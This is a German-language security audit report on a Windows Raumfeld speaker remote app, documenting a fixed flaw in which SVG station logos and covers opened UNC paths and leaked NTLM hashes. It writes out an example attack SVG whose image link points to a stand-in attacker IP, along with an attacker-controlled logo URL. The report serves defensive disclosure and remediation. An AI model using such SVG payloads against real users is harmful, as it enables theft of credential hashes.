# Security Audit – DeskRemote (Lauf 2, 15.11.2026)

*Damals noch unter dem Arbeitstitel „Raumfeld Desk“; Pfade wie `ui/covers.py` beziehen sich auf das Paket `src/deskremote`.*

## Zusammenfassung
Zweiter Lauf, Stand v2.3.0 + schlanker Build, Fokus auf allem, was seit run 1 (v1) dazugekommen ist: NAS-Musik und fremde DLNA-Server, Cover-/Logo-Lader, Musik-Favoriten, formatierte Kopfzeilen mit Spotify-Icon, HLS-Schutz, neuer Build. Gefunden wurde **eine ausnutzbare Lücke mittlerer Schwere**: SVG-Senderlogos und -Cover konnten über `<image href>` UNC-Pfade öffnen. Windows sendet dabei den NTLM-Hash des Benutzers an den Angreifer – dieselbe Wirkung wie der Fund aus run 1, aber über eine andere Stelle. **Behoben** (in v2.3.1), mit Regressionstests. Die formatierten Kopfzeilen aus v2.2 sind sauber maskiert; der Fix aus run 1 hält.

## Findings

| Schwere | Titel | Status |
|---|---|---|
| MEDIUM | SVG-Logos/Cover öffnen UNC-Pfade → NTLM-Hash-Leak per SMB | behoben |

### MEDIUM – SVG-Logos/Cover öffnen UNC-Pfade
- **Wo (Stand v2.3.0):** `ui/covers.py:261` (`_logo`, `image.loadFromData`), `:253` (Logo aus dem Cache bei jedem Start), `:302` (`_local`, Cover fremder DLNA-Server). Quelle: `core/radio.py:97` (`favicon` aus radio-browser), `raumfeld/media.py:100` (`albumArtURI`).
- **Angriff (a), Internet:** Angreifer trägt bei radio-browser.info einen Sender mit `favicon=https://angreifer/logo.svg` ein (oder kontrolliert den Logo-Host eines Senders). Legt das Opfer ihn als Favorit an, lädt Desk das Logo im Hintergrund bei jedem Aufbau des Ausklappfensters; das SVG enthält `<image xlink:href="//ANGREIFER-IP/s/a.png"/>`, Windows verbindet sich per SMB und sendet den Net-NTLMv2-Hash. Das SVG landet im Logo-Cache und wirkt bei jedem Start erneut.
- **Angriff (b), Heimnetz:** Ein Gerät gibt sich per SSDP als DLNA-Medienserver aus und liefert Cover-Adressen auf sich selbst; wählt das Opfer diese Quelle im Musikfenster, gilt dasselbe.
- **Voraussetzung:** ausgehendes TCP/445 zum Angreifer offen (bei Heimroutern häufig).
- **Belege:** Prüfer (unabhängig) und Auditor: SVG mit Verweis auf lokale Datei bzw. `//127.0.0.1/C$/…` (UNC über den SMB-Client) rendert die fremde Datei; Ende-zu-Ende durch den echten `CoverLoader` inkl. Cache.
- **Fix:** `covers.decode_image` dekodiert nur Rasterformate (jpeg, png, gif, ico, webp, bmp) über `QImageReader`, auch Cache-Dateien; SVG-Plugin und Qt6Svg fliegen zusätzlich aus dem Build (`RaumfeldDesk.spec`). Folge: SVG-Senderlogos werden nicht mehr angezeigt.

## Hardening-Notizen
- **Umgesetzt:** Kaputte Bild-Adressen eines fremden DLNA-Servers (z. B. `http://[::1]@10.0.0.5/`) brachen den Aufbau der Musikliste mit einer Ausnahme ab – jetzt abgefangen. Im Heimnetz-Modus sind `0.0.0.0`, `::` und Link-Local-Adressen nicht mehr als Bildquelle erlaubt (unter Windows war darüber zwar kein Loopback erreichbar). Nach Hinweisen der automatischen Commit-Prüfung gilt jetzt eine feste Liste: Heimnetz-Bildquellen nur aus 10/8, 172.16/12, 192.168/16 und fc00::/7 (IPv4 auch in der Form `::ffff:…`); IPv6-Sonderformen mit eingebetteten Zielen (6to4 `2002:…`, Teredo `2001:0:…`, Doku-Netze) werden abgelehnt. Ausnutzbar war davon unter Windows 11 nichts (6to4/Teredo abgeschaltet, `::ffff:127.0.0.1` blockte Python 3.13 schon).
- **Offen, bewusst:** `logo_for` übernimmt für alte Favoriten das Logo irgendeines Senders mit derselben Stream-Adresse (nach dem Fix nur noch ein Rasterbild, kein Risiko mehr). DNS-Rebinding zwischen `public_url()` und dem Abruf bleibt ein Restrisiko. Abspiel-Metadaten fremder DLNA-Server gehen ungeprüft an den Lautsprecher (LAN-Vertrauen, auf 2 MB begrenzt).
- **Aus run 1, weiter offen (LAN-Vertrauen):** XML-Größenlimit erst nach dem Lesen; Lautsprecher rufen beliebige Stream-Adressen ab; Geräteadressen dürfen jede private IP sein.

## Positive Muster (neu seit run 1)
Formatierte Kopfzeilen maskieren jeden fremden Text (`html.escape`, geprüft mit Bild-Payloads) · alle Tooltips konstant oder maskiert · Musik-Favoriten nur aus der Raumfeld-Bibliothek, Metadaten größenbegrenzt · Container-IDs vollständig URL-kodiert, Startindex als Zahl · Weiterleitungen beim Cover-Abruf nur zu öffentlichen HTTPS-Adressen bzw. MusicBrainz/Cover Art Archive · Cache-Dateinamen per SHA-1 (kein Path Traversal) · Log entfernt Steuerzeichen und Zugangsdaten, keine DIDL im Log · HLS-Streams gehen nie an die Anlage.

## Methodik und Grenzen
Wie run 1 bewusst sparsam: Phase 1 (Architektur, Fokus auf Neuem) durch den Autor, Phase 2 durch **einen** unabhängigen Prüfer (Opus) mit Harness-Läufen ausschließlich gegen Attrappen (keine Befehle an die Anlage), Phase 3 als eigene Reproduktion, Fix per Test zuerst (rot → grün, 350 Tests), Phase 6 als Selbstprüfung der Zeilenangaben gegen v2.3.0. Ein ausgehender SMB-Verbindungsaufbau zu einer fremden Adresse ließ sich in der Testumgebung nicht beobachten; der UNC-Weg über den Windows-SMB-Client ist lokal belegt, die Kette bis zum Hash-Versand entspricht run 1. Jeder Lauf findet nur einen Teil – ein weiterer Lauf erhöht die Abdeckung.
